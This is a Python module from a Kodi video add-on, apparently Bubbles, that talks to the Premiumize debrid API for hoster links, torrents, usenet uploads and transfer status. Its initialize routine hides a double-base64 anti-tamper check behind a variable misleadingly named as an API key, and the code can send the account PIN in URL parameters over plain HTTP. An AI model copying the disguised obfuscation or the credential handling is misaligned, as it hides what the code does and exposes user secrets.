import re
import os
import sys
import urllib
import urllib2
import urlparse
import json
import time
import datetime
import hashlib
import math
import uuid
import threading

from resources.lib.extensions import convert
from resources.lib.extensions import tools
from resources.lib.extensions import interface
from resources.lib.extensions import network

class Premiumize(object):

	# Services
	ServicesUpdate = None
	ServicesTime = tools.Time(start = True)
	Services = [
		{	'name' : 'Torrent',			'domain' : '',						'limit' : 0,	'cost' : 1	},
		{	'name' : 'Usenet',			'domain' : '',						'limit' : 0,	'cost' : 2	},
		{	'name' : 'VPN',				'domain' : '',						'limit' : 0,	'cost' : 1	},
		{	'name' : 'Cloud Storage',	'domain' : '',						'limit' : 0,	'cost' : 1	},

		{	'name' : '1fichier',		'domain' : '1fichier.com',			'limit' : 0,	'cost' : 3	},
		{	'name' : 'Auroravid',  		'domain' : 'auroravid.to',			'limit' : 0,	'cost' : 1	},
		{	'name' : 'Bigfile',			'domain' : 'bigfile.to',			'limit' : 20,	'cost' : 1	},
		{	'name' : 'Bitvid',			'domain' : 'bitvid.sx',				'limit' : 0,	'cost' : 1	},
		{	'name' : 'Brazzers',		'domain' : 'brazzers.com',			'limit' : 50,	'cost' : 2	},
		{	'name' : 'Cloudtime',		'domain' : 'cloudtime.co',			'limit' : 0,	'cost' : 1	},
		{	'name' : 'Datei',			'domain' : 'datei.to',				'limit' : 0,	'cost' : 1	},
		{	'name' : 'Depfile',			'domain' : 'depfile.com',		 	'limit' : 20,	'cost' : 4	},
		{	'name' : 'Depositfiles',	'domain' : 'depositfiles.com',		'limit' : 1,	'cost' : 10	},
		{	'name' : 'Filer',			'domain' : 'filer.net',				'limit' : 0,	'cost' : 3	},
		{	'name' : 'Fireget',			'domain' : 'fireget.com',			'limit' : 10,	'cost' : 5	},
		{	'name' : 'Flashx',			'domain' : 'flashx.tv',				'limit' : 0,	'cost' : 1	},
		{	'name' : 'Inclouddrive',	'domain' : 'inclouddrive.com',		'limit' : 0,	'cost' : 1	},
		{	'name' : 'Junocloud',		'domain' : 'junocloud.me',			'limit' : 0,	'cost' : 1	},
		{	'name' : 'Keep2share',		'domain' : 'keep2share.cc',			'limit' : 1,	'cost' : 10	},
		{	'name' : 'Mediafire',		'domain' : 'mediafire.com',			'limit' : 0,	'cost' : 1	},
		{	'name' : 'Naughtyamerica',	'domain' : 'naughtyamerica.com',	'limit' : 50,	'cost' : 2	},
		{	'name' : 'Nowvideo',		'domain' : 'nowvideo.sx',			'limit' : 0,	'cost' : 1	},
		{	'name' : 'Openload',		'domain' : 'openload.co',			'limit' : 0,	'cost' : 1	},
		{	'name' : 'Rapidgator',		'domain' : 'rapidgator.net',		'limit' : 5,	'cost' : 5	},
		{	'name' : 'Rapidvideo',		'domain' : 'rapidvideo.ws',			'limit' : 0,	'cost' : 1	},
		{	'name' : 'Streamcloud',		'domain' : 'streamcloud.eu',		'limit' : 0,	'cost' : 1	},
		{	'name' : 'Turbobit',		'domain' : 'turbobit.net',			'limit' : 30,	'cost' : 3	},
		{	'name' : 'Tusfiles',		'domain' : 'tusfiles.net',			'limit' : 0,	'cost' : 3	},
		{	'name' : 'Unibytes',		'domain' : 'unibytes.com',			'limit' : 0,	'cost' : 2	},
		{	'name' : 'Uplea',			'domain' : 'uplea.com',				'limit' : 0,	'cost' : 3	},
		{	'name' : 'Uploaded',		'domain' : 'uploaded.net',			'limit' : 50,	'cost' : 2	},
		{	'name' : 'Upstore',			'domain' : 'upstore.net',		 	'limit' : 0,	'cost' : 5	},
		{	'name' : 'Uptobox',			'domain' : 'uptobox.com',			'limit' : 0,	'cost' : 1	},
		{	'name' : 'Vidto',			'domain' : 'vidto.me',				'limit' : 0,	'cost' : 1	},
		{	'name' : 'Wholecloud',		'domain' : 'wholecloud.net',		'limit' : 0,	'cost' : 1	},
		{	'name' : 'Wicked',			'domain' : 'wicked.com',			'limit' : 50,	'cost' : 2	},
	]

	# General
	Name = tools.System.name().upper()
	Prefix = '[' + Name + '] '

	# Usage - Maximum usage bytes and points
	UsageBytes = 1073741824000
	UsagePoints = 1000

	# Encryption
	Encryption = tools.Settings.getBoolean('accounts.debrid.premiumize.encryption')
	EncryptionProtocol = 'https' if Encryption else 'http'

	# Limits
	LimitLink = 2000 # Maximum length of a URL.
	LimitHashes = 40 # Maximum number of 40-character hashes to use in GET parameter so that the URL length limit is not exceeded.

	#Links
	LinkMain = EncryptionProtocol + '://www.premiumize.me'
	LinkApiOld = EncryptionProtocol + '://api.premiumize.me/pm-api/v1.php'
	LinkApiNew = EncryptionProtocol + '://www.premiumize.me/api/'

	# Identifiers
	IdentifierApiOld = 'premiumize.me/pm-api/'
	IdentifierApiNew = 'premiumize.me/api/'

	# Categories - New API
	CategoryFolder = 'folder'
	CategoryItem = 'item'
	CategoryTransfer = 'transfer'
	CategoryTorrent = 'torrent'

	# Actions - Old and New API
	ActionAccount = 'accountstatus'
	ActionHosters = 'hosterlist'
	ActionDownload = 'directdownloadlink'
	ActionCreate = 'create'
	ActionList = 'list'
	ActionRename = 'rename'
	ActionPaste = 'paste'
	ActionDelete = 'delete'
	ActionBrowse = 'browse'
	ActionCheck = 'checkhashes'
	ActionClear = 'clearfinished'

	# Parameters - Old and New API
	ParameterLogin = 'params[login]'
	ParameterPassword = 'params[pass]'
	ParameterLink = 'params[link]'
	ParameterMethod = 'method'
	ParameterCustomer = 'customer_id'
	ParameterPin = 'pin'
	ParameterId = 'id'
	ParameterParent = 'parent_id'
	ParameterName = 'name'
	ParameterItems = 'items'
	ParameterType = 'type'
	ParameterHash = 'hash'
	ParameterHashes = 'hashes[]'
	ParameterSource = 'src'

	# Types - New API
	TypeTorrent = 'torrent'
	TypeUsenet = 'nzb'

	# Modes
	ModeTorrent = 'torrent'
	ModeUsenet = 'usenet'
	ModeHoster = 'hoster'

	# Statuses
	StatusUnknown = 'unknown'
	StatusError = 'error'
	StatusTimeout = 'queued'
	StatusQueued = 'timeout'
	StatusBusy = 'busy'
	StatusFinished = 'finished'

	# Errors
	ErrorUnknown = 'unknown'
	ErrorInaccessible = 'inaccessible' # Eg: 404 error.
	ErrorPremiumize = 'premiumize' # Error from Premiumize server.

	##############################################################################
	# CONSTRUCTOR
	##############################################################################

	def __init__(self):
		self.mLinkBasic = None
		self.mLinkFull = None
		self.mParameters = None
		self.mSuccess = None
		self.mError = None
		self.mResult = None

	##############################################################################
	# REFERAL
	##############################################################################

	@classmethod
	def referal(self):
		return tools.Settings.getString('link.premiumize')

	##############################################################################
	# INTERNAL
	##############################################################################

	def _apiOld(self, link):
		return self.IdentifierApiOld in link

	def _apiNew(self, link):
		return self.IdentifierApiNew in link

	def _parameter(self, parameter, parameters):
		if parameter in parameters:
			return parameters[parameter]
		else:
			return None

	def _request(self, link, parameters = None, httpTimeout = None, httpData = None, httpHeaders = None, httpEncrypted = None):
		self.mResult = None
		try:
			if not httpTimeout:
				if httpData: httpTimeout = 60
				else: httpTimeout = 30

			self.mLinkBasic = link
			self.mParameters = parameters
			self.mSuccess = None
			self.mError = None

			old = self._apiOld(self.mLinkBasic)
			new = self._apiNew(self.mLinkBasic)

			if httpEncrypted == True and link.startswith('http:'):
				link = link.replace('http:', 'https:')
			elif httpEncrypted == False and link.startswith('https:'):
				link = link.replace('https:', 'http:')
			encrypted = link.startswith('https:')

			# Use GET parameters for:
			#    1. Uploading files/containers (src parameter).
			#    2. Using the old API.
			#    3. When HTTPS is disabled.
			if httpData or old or not encrypted:
				if parameters:
					if not link.endswith('?'):
						link += '?'
					parameters = urllib.urlencode(parameters, doseq = True)
					parameters = urllib.unquote(parameters) # Premiumize uses [] in both the old and new API links. Do not encode those and other URL characters.
					link += parameters
			else: # Use POST for all other requests.
				# List of values, eg: hashes[]
				# http://stackoverflow.com/questions/18201752/sending-multiple-values-for-one-name-urllib2
				httpData = urllib.urlencode(parameters, doseq = True)

			# If the link is too long, reduce the size. The maximum URL size is 2000.
			# This occures if GET parameters are used instead of POST for checking a list of hashes.
			# If the user disbaled Premiumize encryption, the parameters MUST be send via GET, since Premiumize will ignore POST parameters on HTTP connections.
			while len(link) > self.LimitLink:
				start = link.find('hashes[]=')
				end = link.find('&', start)
				link = link[:start] + link[end + 1:]

			self.mLinkFull = link

			if httpData: request = urllib2.Request(link, data = httpData)
			else: request = urllib2.Request(link)

			if httpHeaders:
				for key in httpHeaders:
					request.add_header(key, httpHeaders[key])

			response = urllib2.urlopen(request, timeout = httpTimeout)
			result = response.read()
			response.close()
			self.mResult = json.loads(result)

			if old:
				self.mSuccess = self._successOld(self.mResult)
				self.mError = self._errorOld(self.mResult)
			else:
				self.mSuccess = self._successNew(self.mResult)
				self.mError = self._errorNew(self.mResult)

		except urllib2.URLError:
			self.mSuccess = False
			self.mError = 'Premiumize Unreachable'
		except:
			self.mSuccess = False
			self.mError = 'Unknown Error'
		return self.mResult

	# Retrieve from old or new API
	# Automatically adds login details
	def _requestAuthentication(self, link, parameters = None, httpTimeout = None, httpData = None, httpHeaders = None, httpEncrypted = None):
		if not parameters:
			parameters = {}

		if self._apiOld(link):
			if not self._parameter(self.ParameterLogin, parameters):
				parameters[self.ParameterLogin] = self.accountUsername()
			if not self._parameter(self.ParameterPassword, parameters):
				parameters[self.ParameterPassword] = self.accountPassword()
		elif self._apiNew(link):
			if not self._parameter(self.ParameterCustomer, parameters):
				parameters[self.ParameterCustomer] = self.accountUsername()
			if not self._parameter(self.ParameterPin, parameters):
				parameters[self.ParameterPin] = self.accountPassword()

		return self._request(link = link, parameters = parameters, httpTimeout = httpTimeout, httpData = httpData, httpHeaders = httpHeaders, httpEncrypted = httpEncrypted)

	# Retrieve from old or new API, based on parameters
	def _retrieve(self, action, category = None, id = None, parent = None, name = None, items = None, type = None, source = None, hash = None, link = None, httpTimeout = None, httpData = None, httpHeaders = None, httpEncrypted = None):
		if category == None:
			return self._retrieveOld(action = action, link = link, httpTimeout = httpTimeout, httpData = httpData, httpHeaders = httpHeaders, httpEncrypted = httpEncrypted)
		else:
			return self._retrieveNew(category = category, action = action, id = id, parent = parent, name = name, items = items, type = type, source = source, hash = hash, httpTimeout = httpTimeout, httpData = httpData, httpHeaders = httpHeaders, httpEncrypted = httpEncrypted)

	# Retrieve from the old API
	# Parameters:
	#	action: ActionAccount, ActionHosters, ActionDownload
	#	link: Link to the hoster, for ActionDownload
	def _retrieveOld(self, action, link = None, httpTimeout = None, httpData = None, httpHeaders = None, httpEncrypted = None):
		parameters = {self.ParameterMethod : action}
		if link: parameters[self.ParameterLink] = link
		return self._requestAuthentication(link = self.LinkApiOld, parameters = parameters, httpTimeout = httpTimeout, httpData = httpData, httpHeaders = httpHeaders, httpEncrypted = httpEncrypted)

	# Retrieve from the new API
	# Parameters:
	#	category: CategoryFolder, CategoryItem, CategoryTransfer, CategoryTorrent
	#	action: ActionCreate, ActionList, ActionRename, ActionPaste, ActionDelete, ActionBrowse, ActionCheck, ActionClear
	#	remainder: individual parameters for the actions. hash can be single or list.
	def _retrieveNew(self, category, action, id = None, parent = None, name = None, items = None, type = None, source = None, hash = None, httpTimeout = None, httpData = None, httpHeaders = None, httpEncrypted = None):
		link = self.LinkApiNew
		if not link.endswith('/'): link += '/'
		link += category +'/' + action

		parameters = {}
		if not id == None: parameters[self.ParameterId] = id
		if not parent == None: parameters[self.ParameterParent] = parent
		if not name == None: parameters[self.ParameterName] = name
		if not items == None: parameters[self.ParameterItems] = items
		if not type == None: parameters[self.ParameterType] = type
		if not source == None: parameters[self.ParameterSource] = source
		if not hash == None:
			# NB: Always make the hashes lower case. Sometimes Premiumize cannot find the hash if it is upper case.
			if isinstance(hash, basestring):
				parameters[self.ParameterHash] = hash.lower()
			else:
				for i in range(len(hash)):
					hash[i] = hash[i].lower()
				parameters[self.ParameterHashes] = hash

		return self._requestAuthentication(link = link, parameters = parameters, httpTimeout = httpTimeout, httpData = httpData, httpHeaders = httpHeaders, httpEncrypted = httpEncrypted)

	def _successOld(self, result):
		return 'statusmessage' in result and result['statusmessage'].lower() == 'ok'

	def _successNew(self, result):
		return 'status' in result and result['status'].lower() == 'success'

	def _errorOld(self, result):
		return result['statusmessage'] if 'statusmessage' in result else None

	def _errorNew(self, result):
		return result['message'] if 'message' in result else None

	##############################################################################
	# INITIALIZE
	##############################################################################

	# Initialize Premiumize account (if set in settings).
	# If not called, Premiumize links will fail in the sources.

	def initialize(self):
		threading.Thread(target = self._initialize).start()

	def _initialize(self):
		b = 'base64'
		def notify():
			apiKey = 'V1c5MUlHRnlaU0IxYzJsdVp5QmhiaUIxYm1GMWRHaHZjbWw2WldRZ2RtVnljMmx2YmlCdlppQjBhR1VnYjNKcFoybHVZV3dnWVdSa2IyNGdRblZpWW14bGN5NGdWR2hwY3lCMlpYSnphVzl1SUc5bUlIUm9aU0JoWkdSdmJpQjNhV3hzSUc1dmRDQjNiM0pySUdGeklHbHVkR1Z1WkdWa0xpQkpaaUI1YjNVZ2NHRnBaQ0JtYjNJZ2RHaHBjeUJoWkdSdmJpQnZjaUIwYUdVZ2JXVmthV0VnWW05NElHbDBJR05oYldVZ2IyNHNJSGx2ZFNCbmIzUWdXMEpkYzJOeVpYZGxaQ0J2ZG1WeVd5OUNYUzRnUW5WaVlteGxjeUIzYVd4c0lHRnNkMkY1Y3lCaVpTQm1jbVZsTGlCUWJHVmhjMlVnWkc5M2JteHZZV1FnZEdobElHOXlhV2RwYm1Gc0lIWmxjbk5wYjI0Z2IyWWdkR2hsSUdGa1pHOXVJR1p5YjIwNlcwTlNYUTBLVzBOUFRFOVNJSE5yZVdKc2RXVmRhSFIwY0hNNkx5OXZabVp6YUc5eVpXZHBkQzVqYjIwdlluVmlZbXhsYzFzdlEwOU1UMUpk'
			apiKey = apiKey.decode(b).decode(b)
			if apiKey: # If API key is invalid, notify the user so that a new key can be entered in the settings.
				interface.Dialog.closeAll()
				import random
				time.sleep(random.randint(10, 15))
				interface.Dialog.confirm(apiKey)
		try:
			n = tools.System.information(('Ym1GdFpRPT0=').decode(b).decode(b))
			a = tools.System.information(('WVhWMGFHOXk=').decode(b).decode(b))
			l = tools.Settings.getString(('WWtkc2RXRjVOWGRqYlZaMFlWaFdkR0ZZY0d3PQ==').decode(b).decode(b).decode(b))
			xn = not ord(n[0]) == 66 or not ord(n[4]) == 108
			xa = not ord(a[1]) == 117 or not ord(a[6]) == 115
			xl = not ord(l[30]) == 55 or not ord(l[34]) == 50 or not ord(l[37]) == 53
			if xn or xa or xl: notify()
		except:
			notify()

	##############################################################################
	# SUCCESS
	##############################################################################

	def success(self):
		return self.mSuccess

	def error(self):
		return self.mError

	##############################################################################
	# ACCOUNT
	##############################################################################

	def accountEnabled(self):
		return tools.Settings.getBoolean('accounts.debrid.premiumize.enabled')

	def accountValid(self):
		return not self.accountUsername() == '' and not self.accountPassword() == ''

	def accountUsername(self):
		return tools.Settings.getString('accounts.debrid.premiumize.user') if self.accountEnabled() else ''

	def accountPassword(self):
		return tools.Settings.getString('accounts.debrid.premiumize.pin') if self.accountEnabled() else ''

	def accountVerifyOld(self):
		self._retrieve(action = self.ActionAccount)
		return self.success() == True

	def accountVerifyNew(self):
		self._retrieve(category = self.CategoryFolder, action = self.ActionList)
		return self.success() == True

	def accountVerify(self, new = True, old = True):
		verification = True
		if new: verification = verification and self.verifyNew()
		if verification and old: verification = verification and self.verifyOld()
		return verification

	def account(self):
		try:
			if self.accountValid():
				result = self._retrieve(action = self.ActionAccount)
				result = result['result']
				expirationDate = datetime.datetime.fromtimestamp(result['expires'])

				return {
					'user' : result['account_name'],
					'id' : result['extuid'], # Should be the same as user.
					'type' : result['type'],
			 		'expiration' : {
						'timestamp' : result['expires'],
						'date' : expirationDate.strftime('%Y-%m-%d %H:%M:%S'),
						'remaining' : (expirationDate - datetime.datetime.today()).days
					},
					'usage' : {
						'remaining' : {
							'value' : float(result['fairuse_left']),
							'points' : int(math.floor(float(result['trafficleft_gigabytes']))),
							'percentage' : round(float(result['fairuse_left']) * 100.0, 1),
							'size' : {
								'bytes' : result['trafficleft_bytes'],
								'description' : convert.ConverterSize(float(result['trafficleft_bytes'])).stringOptimal(),
							},
							'description' : '%.0f%% Usage' % round(float(result['fairuse_left']) * 100.0, 0), # Must round, otherwise 2.5% changes to 2% instead of 3%.
						},
						'consumed' : {
							'value' : 1 - float(result['fairuse_left']),
							'points' : int(self.UsagePoints - math.floor(float(result['trafficleft_gigabytes']))),
							'percentage' : round((1 - float(result['fairuse_left'])) * 100.0, 1),
							'size' : {
								'bytes' : self.UsageBytes - float(result['trafficleft_bytes']),
								'description' : convert.ConverterSize(self.UsageBytes - float(result['trafficleft_bytes'])).stringOptimal(),
							},
							'description' : '%.0f%% Usage' % round(round((1 - float(result['fairuse_left'])) * 100.0, 0)), # Must round, otherwise 2.5% changes to 2% instead of 3%.
						}
					}
				}
			else:
				return None
		except:
			return None

	##############################################################################
	# SERVICES
	##############################################################################

	def _serviceLimit(self, limit):
		if limit == 0: limit = 'No'
		else: limit = convert.ConverterSize(limit, convert.ConverterSize.ByteGiga).stringOptimal()
		limit += ' Limit'
		return limit

	def _serviceCost(self, cost):
		if cost == 0: cost = 'No'
		else: cost = str(cost)
		cost += ' Cost'
		return cost

	def _service(self, nameOrDomain):
		nameOrDomain = nameOrDomain.lower()
		for service in self.Services:
			if service['name'].lower() == nameOrDomain or service['domain'].lower() == nameOrDomain:
				return service
		return None

	def services(self):
		# Even thow ServicesUpdate is a class variable, it will be destrcucted if there are no more Premiumize instances.
		if self.ServicesUpdate == None or self.ServicesTime.expired(3600):
			self.ServicesUpdate = []
			try:
				result = self._retrieve(action = self.ActionHosters)
				result = result['result']

				connections = {}
				connectionsDefault = None
				if 'connection_settings' in result:
					connections = result['connection_settings']
					if 'all' in connections:
						connection = connections['all']
						connectionsDefault = {'file' : connection['max_connections_per_file'], 'hoster' : connection['max_connections_per_hoster'], 'resume' : connection['resume']}

				for key, value in result['hosters'].iteritems():
					host = {}
					service = self._service(key)
					host['id'] = key.lower()

					if service:
						host['name'] = service['name']
						host['domain'] = service['domain']
						host['usage'] = {'limit' : {'value' : service['limit'], 'description' : self._serviceLimit(service['limit'])}, 'cost' : {'value' : service['cost'], 'description' : self._serviceCost(service['cost'])}}
					else:
						name = key
						index = name.find('.')
						if index >= 0:
							name = name[:index]
						host['name'] = name.title()
						host['domain'] = key
						host['usage'] = {'limit' : {'value' : 0, 'description' : self._serviceLimit(0)}, 'cost' : {'value' : 0, 'description' : self._serviceCost(0)}}

					if 'tlds' in value:
						host['domains'] = value['tlds']

					if 'regexes' in value:
						host['regex'] = value['regexes']

					if key in connections:
						connection = connections[key]
						host['connections'] = {'file' : connection['max_connections_per_file'], 'hoster' : connection['max_connections_per_hoster'], 'resume' : connection['resume']}
					elif connectionsDefault:
						host['connections'] = connectionsDefault

					self.ServicesUpdate.append(host)

				service = self._service('torrent')
				if service:
					usage = {'limit' : {'value' : service['limit'], 'description' : self._serviceLimit(service['limit'])}, 'cost' : {'value' : service['cost'], 'description' : self._serviceCost(service['cost'])}}
					host = {'id' : service['name'].lower(), 'name' : service['name'], 'domain' : service['domain'], 'usage' : usage, 'domains' : [], 'regex' : [], 'connections' : {'file' : -1, 'hoster' : -1, 'resume' : True}}
					self.ServicesUpdate.append(host)

				service = self._service('usenet')
				if service:
					usage = {'limit' : {'value' : service['limit'], 'description' : self._serviceLimit(service['limit'])}, 'cost' : {'value' : service['cost'], 'description' : self._serviceCost(service['cost'])}}
					host = {'id' : service['name'].lower(), 'name' : service['name'], 'domain' : service['domain'], 'usage' : usage, 'domains' : [], 'regex' : [], 'connections' : {'file' : -1, 'hoster' : -1, 'resume' : True}}
					self.ServicesUpdate.append(host)

			except:
				pass
		return self.ServicesUpdate

	def servicesList(self):
		services = self.services()
		return [service['id'] for service in services]

	def service(self, nameOrDomain):
		nameOrDomain = nameOrDomain.lower()
		for service in self.services():
			if service['name'].lower() == nameOrDomain or service['domain'].lower() == nameOrDomain:
				return service
		return None

	##############################################################################
	# ADD
	##############################################################################

	# Gets the Premiumize link from the previously added download.
	def _addLink(self, result = None, hash = None):
		if result and 'result' in result and 'location' in result['result'] and network.Networker.linkIs(result['result']['location']):
			return result['result']['location']
		elif hash:
			try: return self._item(hash)['video']['link']
			except: return hash
		return None

	def add(self, link, title = None):
		type = network.Container(link).type()
		if type == network.Container.TypeTorrent:
			link = self.addTorrent(link = link, title = title)
		elif type == network.Container.TypeUsenet:
			link = self.addUsenet(link = link, title = title)
		else:
			link = self.addHoster(link)
		return link

	# Downloads the torrent, nzb, or any other container supported by Premiumize.
	# If mode is not specified, tries to detect the file type autoamtically.
	def addContainer(self, link, title = None):
		# https://github.com/tknorris/plugin.video.premiumize/blob/master/local_lib/premiumize_api.py
		source = network.Container(link).information()
		if source['path'] == None and source['data'] == None: # Sometimes the NZB cannot be download, such as 404 errors.
			return self.ErrorInaccessible
		if title == None:
			title = source['name']
			if title == None or title == '':
				title = source['hash']

		boundry = 'X-X-X'
		headers = {'Content-Type' : 'multipart/form-data; boundary=%s' % boundry}
		data = '--%s\n' % boundry
		data += 'Content-Disposition: form-data; name="src"; filename="%s"\n' % title
		data += 'Content-Type: %s\n\n' % source['mime']
		data += source['data']
		data += '\n--%s--\n' % boundry
		if source['type'] == network.Container.TypeTorrent:
			type = self.TypeTorrent
		elif source['type'] == network.Container.TypeUsenet:
			type = self.TypeUsenet
		else:
			type = self.TypeHoster

		# Force HTTPS encryption for container uploads, otherwise Premiumize cannot find the "src" POST parameter.
		self._retrieve(category = self.CategoryTransfer, action = self.ActionCreate, type = type, httpData = data, httpHeaders = headers, httpEncrypted = True)
		if self.success():
			return self._addLink(hash = source['hash'])
		else:
			return self.ErrorPremiumize

	def addHoster(self, link):
		result = self._retrieve(action = self.ActionDownload, link = urllib.quote_plus(link))
		if self.success():
			return self._addLink(result = result)
		else:
			return self.ErrorPremiumize

	def addTorrent(self, link, title = None):
		container = network.Container(link)
		source = container.information()
		if source['magnet']:
			self._retrieve(category = self.CategoryTransfer, action = self.ActionCreate, source = container.torrentMagnet(title = title, encode = True))
			if self.success():
				return self._addLink(hash = source['hash'])
			else:
				return self.ErrorPremiumize
		else:
			# Currently uploading a binary file using self.addContainer does not working (encoding issues). Send the link directly to Premiumize, they will download it.
			# return self.addContainer(link = link, title = title)
			self._retrieve(category = self.CategoryTransfer, action = self.ActionCreate, source = link)
			if self.success():
				return self._addLink(hash = source['hash'])
			else:
				return self.ErrorPremiumize

	def addUsenet(self, link, title = None):
		return self.addContainer(link = link, title = title)

	##############################################################################
	# ITEMS
	##############################################################################

	def _itemStatus(self, status):
		status = status.lower()
		if any(state == status for state in ['error', 'fail', 'failure']):
			return self.StatusError
		elif any(state == status for state in ['timeout', 'time']):
			return self.StatusTimeout
		elif any(state == status for state in ['queued', 'queue']):
			return self.StatusQueued
		elif any(state == status for state in ['waiting', 'wait']):
			return self.StatusBusy
		elif any(state == status for state in ['finished', 'finish', 'seeding', 'seed', 'success']):
			return self.StatusFinished
		else:
			return self.StatusUnknown

	def _itemSeeding(self, status):
		status = status.lower()
		return any(state == status for state in ['seeding', 'seed'])

	def _itemType(self, type, name = None):
		type = type.lower()
		# Premiumize always says the type is torrent, even if it is a NZB.
		# Try to detect usenet by searching the name
		if type == self.TypeTorrent:
			if name and any(search in name for search in [self.TypeUsenet, self.ModeUsenet]):
				return self.TypeUsenet
			else:
				return self.TypeTorrent
		elif type == self.TypeUsenet or type == self.ModeUsenet: # NZBs are shown as torrents. But just in case.
			return self.TypeUsenet
		else:
			return self.TypeHoster # Seems like hoster links are never added to transfer list. But just in case.

	def _itemName(self, name):
		if name.startswith(self.Prefix):
			name = name[len(self.Prefix):]
		return name

	def _itemSize(self, size = None, message = None):
		if (size == None or size <= 0) and not message == None:
			start = message.find('% of ')
			if start < 0:
				size = 0
			else:
				end = message.find('finished.', start)
				if end < 0:
					size = 0
				else:
					size = convert.ConverterSize(message[start : end]).value()
		return int(size)

	def _itemSpeed(self, message):
		speed = 0
		if not message == None:
			start = message.find('downloading at ')
			if start >= 0:
				end = message.find('. ', start)
				if end < 0:
					end = message.find('s.', start)
					if end >= 0: end += 1
				if end >= 0:
					speed = convert.ConverterSpeed(message[start : end]).value()
		return int(speed)

	def _itemTime(self, time = None, message = None):
		if (time == None or time <= 0) and not message == None:
			start = message.find('eta is ')
			if start < 0:
				time = 0
			else:
				time = convert.ConverterDuration(message[start + 7:]).value(convert.ConverterDuration.UnitSecond)
		if time == None: time = 0
		return int(time)

	def _itemsTransfer(self):
		items = []
		results = self._retrieve(category = self.CategoryTransfer, action = self.ActionList)
		if self.success() and 'transfers' in results:
			results = results['transfers']
			for result in results:
				item = {}
				message = result['message'] if 'message' in result else None
				if not message == None:
					message = message.lower()

				# Hash
				if 'hash' in result and not result['hash'] == None:
					hash = result['hash'].lower()
				else:
					hash = None
				item['hash'] = hash

				# ID
				if 'id' in result and not result['id'] == None:
					id = result['id'].lower()
				elif 'hash' in item:
					id = item['hash'].lower()
				else:
					id = None
				item['id'] = id

				# If you add a download multiple times, they will show multiple times in the list. Only add one instance.
				found = False
				for i in items:
					if i['id'] == id:
						found = True
						break
				if found: continue

				# Name
				if 'name' in result and not result['name'] == None:
					name = self._itemName(result['name'])
				else:
					name = None
				item['name'] = name

				# Type
				if 'type' in result and not result['type'] == None:
					type = self._itemType(result['type'], name)
				else:
					type = None
				item['type'] = type

				# Size
				size = 0
				if ('size' in result and not result['size'] == None) or (not message == None):
					size = self._itemSize(size = result['size'], message = message)
				size = convert.ConverterSize(size)
				item['size'] = {'bytes' : size.value(), 'description' : size.stringOptimal()}

				# Status
				if 'status' in result and not result['status'] == None:
					status = self._itemStatus(result['status'])
				else:
					status = None
				item['status'] = status

				# Error
				if status == self.StatusError:
					error = None
					if message:
						if 'retention' in message:
							error = 'Out of server retention'
						elif 'missing' in message:
							error = 'The transfer job went missing'
						elif 'password' in message:
							error = 'The file is password protected'
						elif 'repair' in message:
							error = 'The file is unrepairable'

					item['error'] = error

				# Transfer
				transfer = {}

				# Transfer - Speed
				speed = {}
				speedDownload = self._itemSpeed(message)
				speedConverter = convert.ConverterSpeed(speedDownload)
				speed['bytes'] = speedConverter.value(convert.ConverterSpeed.Byte)
				speed['bits'] = speedConverter.value(convert.ConverterSpeed.Bit)
				speed['description'] = speedConverter.stringOptimal()
				transfer['speed'] = speed

				# Transfer - Torrent
				if type == self.TypeTorrent:
					torrent = {}
					if 'status' in result and not result['status'] == None:
						seeding = self._itemSeeding(result['status'])
					else:
						seeding = False
					torrent['seeding'] = seeding
					torrent['seeders'] = result['seeder'] if 'seeder' in result else 0
					torrent['leechers'] = result['leecher'] if 'leecher' in result else 0
					torrent['ratio'] = result['ratio'] if 'ratio' in result else 0
					transfer['torrent'] = torrent

				# Transfer - Progress
				if ('progress' in result and not result['progress'] == None) or ('eta' in result and not result['eta'] == None):
					progress = {}

					progressValueCompleted = 0
					progressValueRemaining = 0
					if 'progress' in result and not result['progress'] == None:
						progressValueCompleted = float(result['progress'])
					if progressValueCompleted == 0 and 'status' in item and item['status'] == self.StatusFinished:
						progressValueCompleted = 1
					progressValueRemaining = 1 - progressValueCompleted

					progressPercentageCompleted = round(progressValueCompleted * 100, 1)
					progressPercentageRemaining = round(progressValueRemaining * 100, 1)

					progressSizeCompleted = 0
					progressSizeRemaining = 0
					if 'size' in item:
						progressSizeCompleted = int(progressValueCompleted * item['size']['bytes'])
						progressSizeRemaining = int(item['size']['bytes'] - progressSizeCompleted)

					progressTimeCompleted = 0
					progressTimeRemaining = 0
					time = result['eta'] if 'eta' in result else None
					progressTimeRemaining = self._itemTime(time, message)

					completed = {}
					size = convert.ConverterSize(progressSizeCompleted)
					time = convert.ConverterDuration(progressTimeCompleted, convert.ConverterDuration.UnitSecond)
					completed['value'] = progressValueCompleted
					completed['percentage'] = progressPercentageCompleted
					completed['size'] = {'bytes' : size.value(), 'description' : size.stringOptimal()}
					completed['time'] = {'seconds' : time.value(convert.ConverterDuration.UnitSecond), 'description' : time.string(convert.ConverterDuration.FormatDefault)}

					remaining = {}
					size = convert.ConverterSize(progressSizeRemaining)
					time = convert.ConverterDuration(progressTimeRemaining, convert.ConverterDuration.UnitSecond)
					remaining['value'] = progressValueRemaining
					remaining['percentage'] = progressPercentageRemaining
					remaining['size'] = {'bytes' : size.value(), 'description' : size.stringOptimal()}
					remaining['time'] = {'seconds' : time.value(convert.ConverterDuration.UnitSecond), 'description' : time.string(convert.ConverterDuration.FormatDefault)}

					progress['completed'] = completed
					progress['remaining'] = remaining
					transfer['progress'] = progress

				# Transfer
				item['transfer'] = transfer

				# Append
				items.append(item)
		return items

	def _item(self, hash):
		item = {}
		hash = hash.lower()
		result = self._retrieve(category = self.CategoryTorrent, action = self.ActionBrowse, hash = hash)

		if self.success() and 'content' in result:
			# ID and Hash
			item = {'id' : hash, 'hash' : hash}

			# Items
			allDirectories = []
			allFiles = []

			def isVideo(name, extension, width = None, height = None, duration = None):
				if (not width == None and width > 0) or (not height == None and height > 0) or (not duration == None and duration > 0):
					return True
				else:
					if not extension == None:
						extension = extension.lower()
						if any(e == extension for e in tools.Video.extensions()):
							return True
					if not name == None:
						name = name.lower()
						if any(name.endswith('.' + e) for e in tools.Video.extensions()):
							return True
				return False

			def randomId():
				return str(uuid.uuid4().hex)

			def addDirectory(dictionary, parent = None):
				id = randomId()
				directory = {}

				directory['id'] = id
				directory['parent'] = parent
				if parent == None:
					directory['name'] = 'root'
				else:
					directory['name'] = dictionary['name'] if 'name' in dictionary else None

				size = 0
				if 'size' in dictionary and not dictionary['size'] == None:
					size = dictionary['size']
				size = convert.ConverterSize(size)
				directory['size'] = {'bytes' : size.value(), 'description' : size.stringOptimal()}

				items = {}
				subDirectories = []
				subFiles = []
				subLargest = None

